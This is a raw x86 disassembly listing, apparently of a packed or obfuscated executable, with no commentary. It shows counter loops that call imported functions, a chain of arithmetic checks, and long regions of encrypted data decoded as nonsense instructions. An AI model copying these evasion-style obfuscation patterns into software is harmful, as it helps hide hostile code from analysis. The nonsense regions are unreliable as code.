  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433607,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433607,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433607,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433607
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433607,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433617
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x4335fb,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x4335fb
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x4335fb,ebx
  403a19:	cmp    DWORD PTR ds:0x4335fb,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x4335fb,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x4336d7,0x19
  403a4c:	cmp    DWORD PTR ds:0x4336d7,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x4336d7,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x4336d7
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x4336d7,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43371b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403ad1
  403acb:	mov    eax,ds:0x10208bf7
  403ad0:	jle    0x403b50
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403a94
  403ad7:	jne    0x403b0e
  403ad9:	fidiv  WORD PTR [esi]
  403adb:	cmp    al,0x5f
  403add:	les    eax,FWORD PTR [ebp-0x126de661]
  403ae3:	mov    al,0x85
  403ae5:	enter  0x5d43,0xb5
  403ae9:	sbb    DWORD PTR [edx],0xffffffd7
  403aec:	fmul   QWORD PTR [ecx]
  403aee:	cmp    ch,BYTE PTR [ebx]
  403af0:	daa    
  403af1:	jmp    0x67a0:0x6469ee4c
  403af8:	lods   eax,DWORD PTR ds:[esi]
  403af9:	pop    es
  403afa:	(bad)  
  403afb:	cmc    
  403afc:	xchg   edi,eax
  403afd:	add    ebx,DWORD PTR [ebx+0x4a]
  403b00:	xor    eax,0xf9b1c1ef
  403b05:	fistp  WORD PTR [eax+0x36]
  403b08:	js     0x403b37
  403b0a:	gs fisttp WORD PTR ds:[edx+0x6a]
  403b0f:	xchg   edi,eax
  403b10:	jb     0x403b67
  403b12:	lods   eax,DWORD PTR ds:[esi]
  403b13:	lock cmp BYTE PTR [edi-0x41],al
  403b17:	jns    0x403afe
  403b19:	or     DWORD PTR [ebp+0x2c],esi
  403b1c:	sti    
  403b1d:	mov    ?,WORD PTR [ebp+0x44]
  403b20:	es (bad) 
  403b22:	popa   
  403b23:	cmp    eax,ebp
  403b25:	sahf   
  403b26:	hlt    
  403b27:	adc    eax,0x7d22d5d2
  403b2c:	in     al,dx
  403b2d:	add    edx,DWORD PTR [edi-0x40425922]
  403b33:	dec    ebp
  403b34:	popf   
  403b35:	pop    edx
  403b36:	in     eax,0x39
  403b38:	sbb    esp,ebp
  403b3a:	and    dl,ch
  403b3c:	nop
  403b3d:	cs std 
  403b3f:	sti    
  403b40:	push   0x33
  403b42:	loope  0x403ba7
  403b44:	inc    edi
  403b45:	bts    edi,edx
  403b48:	arpl   bx,ax
  403b4a:	fmul   QWORD PTR [eax-0x3b]
  403b4d:	pop    esi
  403b4e:	push   ss
  403b4f:	inc    esi
  403b50:	retf   
  403b51:	ret    0x529b
  403b54:	stc    
  403b55:	js     0x403b5d
  403b57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b59:	lock outs dx,WORD PTR ds:[esi]
  403b5c:	into   
  403b5d:	pop    ds
  403b5e:	scas   eax,DWORD PTR es:[edi]
  403b5f:	ret    
  403b60:	js     0x403b28
  403b62:	les    eax,FWORD PTR [edi]
  403b64:	loop   0x403bca
  403b66:	(bad)
  403b69:	pop    edi
  403b6a:	xchg   BYTE PTR [eax+0xe],dh
  403b6d:	mov    bl,al
  403b6f:	cmp    DWORD PTR [edx+0x5b829f6e],esp
  403b75:	cs jecxz 0x403b24
  403b78:	inc    ebx
  403b79:	or     bh,BYTE PTR [ecx]
  403b7b:	jns    0x403b49
  403b7d:	repz sub al,0xd8
  403b80:	push   esp
  403b81:	lds    eax,FWORD PTR [ebx]
  403b83:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b85:	dec    edx
  403b86:	sbb    BYTE PTR [ebp-0x31ae0f5],cl
  403b8c:	push   ebx
  403b8d:	jl     0x403bfa
  403b8f:	ins    DWORD PTR es:[edi],dx
  403b90:	or     BYTE PTR [ebx],ah
  403b92:	stos   DWORD PTR es:[edi],eax
  403b93:	outs   dx,BYTE PTR ds:[esi]
  403b94:	call   FWORD PTR [ebp-0xa7c7f55]
  403b9a:	in     eax,dx
  403b9b:	sbb    esp,esi
  403b9d:	retf   0xeff5
  403ba0:	fisub  WORD PTR [ebp-0x17]
  403ba3:	push   ss
  403ba4:	in     al,0xf3
  403ba6:	jnp    0x403ba8
  403ba8:	test   al,0xa3
  403baa:	ror    DWORD PTR [edi+edi*8+0x6772784e],1
  403bb1:	jg     0x403b3b
  403bb3:	pusha  
  403bb4:	ins    BYTE PTR es:[edi],dx
  403bb5:	in     eax,0x91
  403bb7:	or     BYTE PTR [eax-0x65],bl
  403bba:	adc    DWORD PTR ds:0xf40cc8b3,eax
  403bc0:	and    ecx,ebp
  403bc2:	jne    0x403bdd
  403bc4:	stos   BYTE PTR es:[edi],al
  403bc5:	adc    dh,bl
  403bc7:	xor    dh,BYTE PTR [ebx+0x46]
  403bca:	inc    ebx
  403bcb:	in     al,dx
  403bcc:	pop    ebp
  403bcd:	xchg   esi,eax
  403bce:	imul   ebp,DWORD PTR [ebx],0xffffffb7
  403bd1:	and    BYTE PTR [ebx],al
  403bd3:	aaa    
  403bd4:	or     al,BYTE PTR [edi]
  403bd6:	loopne 0x403c15
  403bd8:	sbb    eax,0xdebd314a
  403bdd:	rol    ebp,1
  403bdf:	sbb    BYTE PTR [eax+0x1dd6615d],cl
  403be5:	das    
  403be6:	bound  ebp,QWORD PTR [eax+ebp*4-0x18]
  403bea:	cmc    
  403beb:	xor    esi,DWORD PTR [ecx]
  403bed:	in     al,dx
  403bee:	mov    ah,0xf1
  403bf0:	clc    
  403bf1:	int3   
  403bf2:	adc    BYTE PTR [edi-0x24],cl
  403bf5:	mov    BYTE PTR [edx],bl
  403bf7:	fstp   QWORD PTR [eax-0x45dac04b]
  403bfd:	ret    0xcbc3
  403c00:	popa   
  403c01:	fcom   DWORD PTR [ecx]
  403c03:	pop    ds
  403c04:	out    0xa,al
  403c06:	outs   dx,BYTE PTR ds:[esi]
  403c07:	daa    
  403c08:	les    ecx,FWORD PTR [edx+0x7f]
  403c0b:	lahf   
  403c0c:	jo     0x403c7e
  403c0e:	fcom   QWORD PTR [eax+0x47]
  403c11:	mov    esp,0xf878e833
  403c16:	add    eax,0x82189d85
  403c1b:	retf   
  403c1c:	(bad)
  403c20:	sub    DWORD PTR [ecx+ecx*1],eax
  403c23:	test   eax,0xabb23ffc
  403c28:	mov    ds,WORD PTR [ecx+eiz*8+0x28]
  403c2c:	jecxz  0x403c88
  403c2e:	dec    ebx
  403c2f:	dec    edx
  403c30:	pop    ecx
  403c31:	add    dh,BYTE PTR [ecx]
  403c33:	adc    esi,ecx
  403c35:	pop    edi
  403c36:	dec    esp
  403c37:	retf   
  403c38:	adc    edx,edx
  403c3a:	(bad)  
  403c3b:	jecxz  0x403c13
  403c3d:	mov    esp,0x1a5f60c
  403c42:	jns    0x403c46
  403c44:	call   0x5dec:0xe4f99e7b
  403c4b:	loopne 0x403c46
  403c4d:	gs dec edi
  403c4f:	xlat   BYTE PTR ds:[ebx]
  403c50:	test   eax,0x82ddee41
  403c55:	nop
  403c56:	sub    ebx,edi
  403c58:	repnz test BYTE PTR [eax],cl
  403c5b:	xor    esi,DWORD PTR [edx-0x20]
  403c5e:	mov    ds:0x126e9df2,al
  403c63:	mov    ?,ebp
  403c65:	outs   dx,BYTE PTR ds:[esi]
  403c66:	fcomp  QWORD PTR [edx]
  403c68:	addr16 add eax,0xb2982e6a
  403c6e:	in     eax,0x88
  403c70:	bound  esp,QWORD PTR [edi+0x31]
  403c73:	data16 js 0x403c15
  403c76:	outs   dx,DWORD PTR ds:[esi]
  403c77:	jg     0x403c52
  403c79:	jbe    0x403c6a
  403c7b:	dec    edx
  403c7c:	pop    esp
  403c7d:	or     eax,0x7b4067e9
  403c82:	outs   dx,BYTE PTR ds:[esi]
  403c83:	aaa    
  403c84:	push   ds
  403c85:	out    0x5b,eax
  403c87:	rcl    BYTE PTR [ebp-0x7adc9ce7],cl
  403c8d:	pop    edi
  403c8e:	jno    0x403caa
  403c90:	bound  ebx,QWORD PTR [edi-0x2aa5ecec]
  403c96:	int    0x62
  403c98:	cmp    eax,DWORD PTR [ebx+0x35]
  403c9b:	mov    dl,0x71
  403c9d:	data16 scas al,BYTE PTR es:[edi]
  403c9f:	cli    
  403ca0:	mov    eax,0x5554b43e
  403ca5:	test   al,0xf9
  403ca7:	rcl    BYTE PTR [eax+ecx*8],0x48
  403cab:	xor    al,0x98
  403cad:	add    eax,0xb510ecc
  403cb2:	popf   
  403cb3:	cs clc 
  403cb5:	mov    dl,0x5d
  403cb7:	jle    0x403c92
  403cb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cba:	push   edi
  403cbb:	das    
  403cbc:	mov    WORD PTR [ecx-0x2b],cs
  403cbf:	pop    es
  403cc0:	(bad)  
  403cc1:	sti    
  403cc2:	add    BYTE PTR [ecx-0x61713d9a],cl
  403cc8:	push   ebp
  403cc9:	(bad)  
  403cca:	mov    eax,ds:0xaba6ada2
  403ccf:	popf   
  403cd0:	xor    BYTE PTR [ebx-0x7e],bh
  403cd3:	lods   eax,DWORD PTR ds:[esi]
  403cd4:	add    esi,DWORD PTR [ebp-0x15036f5b]
  403cda:	inc    edi
  403cdb:	cmp    eax,0x8b551262
  403ce0:	xor    eax,0x6559648a
  403ce5:	ret    
  403ce6:	ss jae 0x403ce6
  403ce9:	adc    esi,edx
  403ceb:	and    ebp,DWORD PTR [esi+edi*4+0x60fe6c22]
  403cf2:	jle    0x403d2b
  403cf4:	int    0x8a
  403cf6:	xchg   edi,eax
  403cf7:	xor    edi,0x6
  403cfa:	cmc    
  403cfb:	ret    
  403cfc:	mov    esp,0xe0b690b
  403d01:	xchg   ecx,eax
  403d02:	and    eax,0x8f9cfcb6
  403d07:	data16 mov dl,dl
  403d0a:	jns    0x403d62
  403d0c:	test   al,0x96
  403d0e:	push   ds
  403d0f:	mov    ch,BYTE PTR [ebx]
  403d11:	inc    eax
  403d12:	jbe    0x403d39
  403d14:	scas   eax,DWORD PTR es:[edi]
  403d15:	push   edi
  403d16:	jmp    0xba45191b
  403d1b:	sub    cl,BYTE PTR [esi+0x18]
  403d1e:	pop    ss
  403d1f:	js     0x403cc1
  403d21:	fld    DWORD PTR [eax]
  403d23:	call   DWORD PTR [edx-0x2c66c30b]
  403d29:	in     eax,0x74
  403d2b:	(bad)  
  403d2d:	sub    DWORD PTR [edi+0x1],esp
  403d30:	out    0x59,eax
  403d32:	shl    BYTE PTR [eax+edx*4],cl
  403d35:	pusha  
  403d36:	cmp    esi,ebx
  403d38:	in     eax,dx
  403d39:	mov    ah,0x9d
  403d3b:	xchg   edx,eax
  403d3c:	bt     DWORD PTR [eax-0x329684bc],ebp
  403d43:	mov    DWORD PTR [ebp+0x398c6c67],eax
  403d49:	jmp    0x403d07
  403d4b:	xor    al,ch
  403d4d:	mov    ebx,0x681d1bfd
  403d52:	sbb    ah,cl
  403d54:	gs sbb al,0x18
  403d57:	pop    ebp
  403d58:	fstp   QWORD PTR [ebx-0x73ca25c5]
  403d5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d5f:	in     al,0x40
  403d61:	add    bl,BYTE PTR [edx+0x36]
  403d64:	jns    0x403d0d
  403d66:	imul   ebp,DWORD PTR [esi+0x5d],0xfffffff9
  403d6a:	pop    ss
  403d6b:	push   es
  403d6c:	or     ch,BYTE PTR fs:[edi+0x4e3795b8]
  403d73:	add    DWORD PTR [edi],0x47f688c5
  403d79:	or     DWORD PTR [edx],esi
  403d7b:	std    
  403d7c:	(bad)  
  403d7d:	icebp  
  403d7e:	push   edi
  403d7f:	aas    
  403d80:	adc    ebx,edx
  403d82:	mov    ebp,0x74517e0a
  403d87:	jmp    0x2fa4:0xdc18b610
  403d8e:	das    
  403d8f:	xor    BYTE PTR [edi-0x35c26c22],ah
  403d95:	xchg   esi,eax
  403d96:	cmp    ebp,DWORD PTR [edx]
  403d98:	aas    
  403d99:	fs iret 
  403d9b:	mov    edi,0xc8a2aefa
  403da0:	ins    BYTE PTR es:[edi],dx
  403da1:	loop   0x403d2c
  403da3:	sbb    DWORD PTR [edx+0x5d73525e],edi
  403da9:	push   edx
  403daa:	mov    BYTE PTR cs:[eax],al
  403dad:	add    DWORD PTR [ecx-0x4c5d7002],ebp
  403db3:	cmp    bl,BYTE PTR [eax+0x4d2d821]
  403db9:	js     0x403d85
  403dbb:	add    ecx,DWORD PTR [ebx-0x20d40fa3]
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0x24
  403e75:	lsl    ecx,WORD PTR [eax+0x7e7e1f0a]
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403e81
  403e81:	xor    esi,DWORD PTR [ebx-0x16b69ea5]
  403e87:	outs   dx,DWORD PTR ds:[esi]
  403e88:	pop    eax
  403e89:	mov    WORD PTR [ecx],cs
  403e8b:	mov    ebx,DWORD PTR [esi+0x2c]
  403e8e:	mov    eax,0x5f5b80
  403e93:	ret    
  403e94:	jb     0x403f0a
  403e96:	mov    dl,0xe8
  403e98:	in     eax,dx
  403e99:	sbb    ebp,DWORD PTR [ebx-0x73]
  403e9c:	stos   BYTE PTR es:[edi],al
  403e9d:	ret    0x2905
  403ea0:	mov    esp,0x9da00050
  403ea5:	xlat   BYTE PTR ds:[ebx]
  403ea6:	adc    al,0x93
  403ea8:	jne    0x403ee3
  403eaa:	and    al,0xa9
  403eac:	dec    edx
  403ead:	int3   
  403eae:	push   ebx
  403eaf:	into   
  403eb0:	mov    bl,0x66
  403eb2:	mov    ch,0xfa
  403eb4:	cmp    BYTE PTR [ebx+0x27],0x34
  403eb8:	fild   QWORD PTR [eax-0xdc507d5]
  403ebe:	jl     0x403e83
  403ec0:	stc    
  403ec1:	es pop eax
  403ec3:	jnp    0x403ee9
  403ec5:	loope  0x403e5b
  403ec7:	imul   esp,DWORD PTR [edi-0x656b59b4],0xed2b74ad
  403ed1:	cli    
  403ed2:	enter  0x8752,0x5f
  403ed6:	xor    BYTE PTR [eax],dh
  403ed8:	int    0x85
  403eda:	cmp    esp,DWORD PTR [edx+0x77]
  403edd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ede:	into   
  403edf:	fild   DWORD PTR [edi+esi*4]
  403ee2:	xor    al,0x80
  403ee4:	ins    DWORD PTR es:[edi],dx
  403ee5:	cs sbb al,0x77
  403ee8:	pusha  
  403ee9:	xchg   edx,eax
  403eea:	dec    esi
  403eeb:	dec    edi
  403eec:	sbb    eax,0x810f86db
  403ef1:	xchg   esi,esp
  403ef3:	pop    ebx
  403ef4:	sub    eax,0xd0eaf68a
  403ef9:	fwait
  403efa:	jg     0x403eab
  403efc:	jae    0x403e84
  403efe:	and    eax,0x495061d9
  403f03:	lds    edi,FWORD PTR [edx+0x24]
  403f06:	rcl    DWORD PTR [edx-0x2c],0x5e
  403f0a:	push   ebx
  403f0b:	icebp  
  403f0c:	sub    DWORD PTR [esi],ecx
  403f0e:	sub    al,0x5b
  403f10:	and    BYTE PTR [ebx+0x61],bh
  403f13:	cmp    BYTE PTR [edi],dh
  403f15:	div    BYTE PTR [ebp-0x54]
  403f18:	mov    ecx,0xd202e1f8
  403f1d:	sar    BYTE PTR [ebp+edi*8-0x13648e4a],cl
  403f24:	rcl    BYTE PTR [ebp+0x40dc8d22],cl
  403f2a:	popf   
  403f2b:	mov    esp,edx
  403f2d:	or     ecx,DWORD PTR [esi-0x4b]
  403f30:	or     BYTE PTR [ecx],dh
  403f32:	fisubr WORD PTR [edi]
  403f34:	aam    0x6e
  403f36:	mov    edx,0xae0da4c9
  403f3b:	and    esp,eax
  403f3d:	jg     0x403f9f
  403f3f:	jne    0x403f79
  403f41:	test   BYTE PTR [ecx+eax*2+0x1f],0x2c
  403f46:	or     dl,al
  403f48:	inc    eax
  403f49:	in     al,0xe4
  403f4b:	fsubr  QWORD PTR [eax-0x82b14f0]
  403f51:	pusha  
  403f52:	popa   
  403f53:	and    ecx,DWORD PTR [eax]
  403f55:	jmp    0xda6c624c
  403f5a:	mov    ds:0x3eb7354a,al
  403f5f:	dec    edx
  403f60:	enter  0x34cb,0x93
  403f64:	(bad)  
  403f65:	and    eax,edx
  403f67:	ins    DWORD PTR es:[edi],dx
  403f68:	cmp    DWORD PTR [eax-0x1fd18499],0xffffffeb
  403f6f:	bound  ecx,QWORD PTR [edi+edx*4+0x3b]
  403f73:	or     ebx,edi
  403f75:	lahf   
  403f76:	jp     0x403fad
  403f78:	je     0x403fae
  403f7a:	mov    dh,0x3a
  403f7c:	dec    ecx
  403f7d:	out    dx,al
  403f7e:	scas   eax,DWORD PTR es:[edi]
  403f7f:	std    
  403f80:	stc    
  403f81:	dec    edx
  403f82:	jmp    0xc39f:0xfd33133c
  403f89:	mov    al,0xd2
  403f8b:	(bad)  
  403f8d:	(bad)  [ebx+0x5a748f39]
  403f93:	aas    
  403f94:	lea    eax,[bx+si+0x64c5]
  403f99:	sti    
  403f9a:	loopne 0x403fec
  403f9c:	out    0x6e,eax
  403f9e:	loopne 0x403f52
  403fa0:	imul   eax,DWORD PTR [eax+ebp*2],0x4ba6f540
  403fa7:	sub    BYTE PTR [edx+0x2a],bh
  403faa:	loopne 0x403f33
  403fac:	mov    edi,DWORD PTR [eax]
  403fae:	in     eax,dx
  403faf:	xchg   esi,eax
  403fb0:	xchg   ecx,eax
  403fb1:	int    0xe0
  403fb3:	add    BYTE PTR [ecx],bh
  403fb5:	xchg   esp,eax
  403fb6:	or     DWORD PTR [edi+0x386a4f35],esp
  403fbc:	xor    dl,dl
  403fbe:	dec    ecx
  403fbf:	adc    al,0x8a
  403fc1:	push   es
  403fc2:	pop    es
  403fc3:	ins    DWORD PTR es:[edi],dx
  403fc4:	sbb    bl,bh
  403fc6:	shl    ch,cl
  403fc8:	xor    ch,BYTE PTR [eax+0x525ee83e]
  403fce:	ret    0xc7e4
  403fd1:	push   0x877168e2
  403fd6:	push   edx
  403fd7:	aas    
  403fd8:	jl     0x404059
  403fda:	mov    cl,BYTE PTR [eax]
  403fdc:	dec    ecx
  403fdd:	inc    esp
  403fde:	pop    esp
  403fdf:	sti    
  403fe0:	jle    0x403f85
  403fe2:	in     eax,0x9e
  403fe4:	mov    bh,0xee
  403fe6:	arpl   WORD PTR [edi-0x53],bp
  403fe9:	retf   0xe965
  403fec:	test   eax,0x68e69f1d
  403ff1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ff2:	icebp  
  403ff3:	pop    ecx
  403ff4:	cld    
  403ff5:	xchg   ecx,eax
  403ff6:	add    eax,0x6db7557a
  403ffb:	cmp    ah,BYTE PTR [esi-0x52]
  403ffe:	or     DWORD PTR [eax-0x78],edx
  404001:	pop    esp
  404002:	bnd jle 0x403fab
  404005:	mov    ds:0xd544ec64,eax
  40400a:	push   es
  40400b:	call   0xdf35ef97
  404010:	pop    ebx
  404011:	js     0x403fda
  404013:	js     0x40405f
  404015:	and    DWORD PTR [ecx],0x5f
  404018:	adc    bh,al
  40401a:	popf   
  40401b:	call   0x7150:0x1d2b13b8
  404022:	dec    esp
  404023:	add    dl,0xa6
  404026:	cdq    
  404027:	(bad)  
  404028:	test   DWORD PTR ds:0xca752a88,0xf5560197
  404032:	push   cs
  404033:	sub    eax,0x7bde450e
  404038:	mov    ah,0xa1
  40403a:	pop    es
  40403b:	xor    al,0xaf
  40403e:	mov    ah,ah
  404040:	out    0x93,eax
  404042:	xor    BYTE PTR [esi],cl
  404044:	mov    dl,0xa5
  404046:	mov    edx,0x8fb8da58
  40404b:	pushf  
  40404c:	lods   al,BYTE PTR ds:[esi]
  40404d:	popa   
  40404e:	(bad)  [edx]
  404050:	arpl   WORD PTR [edx-0x3e3cc37c],di
  404056:	aas    
  404057:	xor    edx,esp
  404059:	mov    BYTE PTR [ecx],dh
  40405b:	dec    esi
  40405c:	cdq    
  40405d:	test   DWORD PTR ds:0x5f19fe32,0xed02673b
  404067:	out    0xe3,eax
  404069:	cmc    
  40406a:	data16 or cl,0x35
  40406e:	not    DWORD PTR [esi-0xf806611]
  404074:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404075:	mov    al,ds:0x97efc896
  40407a:	sub    al,0x20
  40407c:	mov    eax,ds:0xedb6af14
  404081:	fldcw  WORD PTR [esi]
  404083:	sbb    eax,0x3acf9a6b
  404088:	xchg   edx,eax
  404089:	push   esi
  40408a:	xchg   ebx,eax
  40408b:	sbb    DWORD PTR [ebp+eax*8+0x3e],ecx
  40408f:	xor    eax,0xbf1d3d01
  404094:	sub    eax,0x7047ac54
  404099:	or     ch,0x2f
  40409c:	sub    al,0x6b
  40409e:	pusha  
  40409f:	jo     0x40406f
  4040a1:	(bad)  
  4040a2:	sbb    BYTE PTR [edx],al
  4040a4:	fist   WORD PTR [ebp+0x79]
  4040a7:	das    
  4040a8:	jecxz  0x404049
  4040aa:	mov    BYTE PTR [ecx+0x68d7911a],0x16
  4040b1:	xchg   esi,eax
  4040b2:	jecxz  0x4040ca
  4040b4:	inc    esi
  4040b5:	arpl   WORD PTR [ebp+eax*4+0x24],si
  4040b9:	loopne 0x40409a
  4040bb:	xchg   edx,eax
  4040bc:	mov    ecx,DWORD PTR [ebp+0x38]
  4040bf:	dec    ebx
  4040c0:	mov    edi,0xd08669a2
  4040c5:	cmp    BYTE PTR [eax+edi*2-0x80],0xf5
  4040ca:	push   esp
  4040cb:	cmp    DWORD PTR [edi+0x490575b7],ebx
  4040d1:	stc    
  4040d2:	xchg   edi,eax
  4040d3:	jmp    0xc82b0441
  4040d8:	retf   
  4040d9:	jmp    0x341:0x34193d9
  4040e0:	addr16 ret 0xbc48
  4040e4:	mov    al,0x76
  4040e6:	nop
  4040e7:	pop    ebp
  4040e8:	stc    
  4040e9:	jmp    0x40409d
  4040eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040ec:	pop    ds
  4040ed:	sbb    cl,0xc9
  4040f0:	repz xor BYTE PTR [edi-0x30b0e319],bl
  4040f7:	add    dh,cl
  4040f9:	sub    al,BYTE PTR [edi+ebx*2]
  4040fc:	imul   ecx,DWORD PTR [ebx+0x6f],0x73d63660
  404103:	jmp    0xea75:0x4f3bd2a4
  40410a:	nop
  40410b:	aaa    
  40410c:	sub    DWORD PTR [bx-0x2b],ebp
  404110:	test   DWORD PTR [edx+0xb4ed53e],0x440d4ace
  40411a:	mov    BYTE PTR [edx],dh
  40411c:	pop    ds
  40411d:	mov    edi,DWORD PTR [edi]
  40411f:	adc    ebp,DWORD PTR [edi+0x7631f51f]
  404125:	jne    0x4040ee
  404127:	(bad)  
  404128:	fcom   QWORD PTR [esi+0x7e]
  40412b:	and    eax,edx
  40412d:	mov    al,0x16
  40412f:	xor    dh,ah
  404131:	repnz cld 
  404133:	xor    BYTE PTR [edi-0x72],bl
  404136:	out    dx,eax
  404137:	push   ebx
  404138:	mov    ebp,0x6994af86
  40413d:	sar    DWORD PTR [ecx],1
  40413f:	xor    ah,BYTE PTR [ebx-0x26]
  404142:	mov    cl,0x32
  404144:	jo     0x40410e
  404146:	out    dx,eax
  404147:	push   ds
  404148:	xchg   edi,eax
  404149:	js     0x404154
  40414b:	outs   dx,BYTE PTR ds:[esi]
  40414c:	repz fdiv QWORD PTR [eax]
  40414f:	(bad)  
  404150:	mov    edi,0x4b58714b
  404155:	daa    
  404156:	jb     0x404188
  404158:	jbe    0x404177
  40415a:	add    esp,eax
  40415c:	in     eax,dx
  40415d:	leave  
  40415e:	es (bad) 
  404160:	dec    esi
  404161:	lock je 0x4041dd
  404164:	pop    esp
  404165:	dec    ecx
  404166:	sub    ebx,edi
  404168:	cmp    ebx,edx
  40416a:	mov    edx,DWORD PTR [ebp-0x38]
  40416d:	jbe    0x404176
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [ebx],dh
  40418b:	jo     0x40414d
  40418d:	xor    BYTE PTR [ebp+ebx*1+0x7e],dh
  404191:	jle    0x4041eb
  404193:	jl     0x404213
  404195:	jle    0x404149
  404197:	push   edi
  404198:	inc    edi
  404199:	bound  ebp,QWORD PTR [ebx+0x2c]
  40419c:	(bad)  
  40419d:	lahf   
  40419e:	nop
  40419f:	sub    edi,esp
  4041a1:	aad    0xa4
  4041a3:	add    cl,BYTE PTR [edi+0x34501512]
  4041a9:	xor    ah,BYTE PTR [edx]
  4041ab:	fwait
  4041ac:	inc    edx
  4041ad:	fimul  DWORD PTR [edi]
  4041af:	les    eax,FWORD PTR [ecx+0x32f3bdfe]
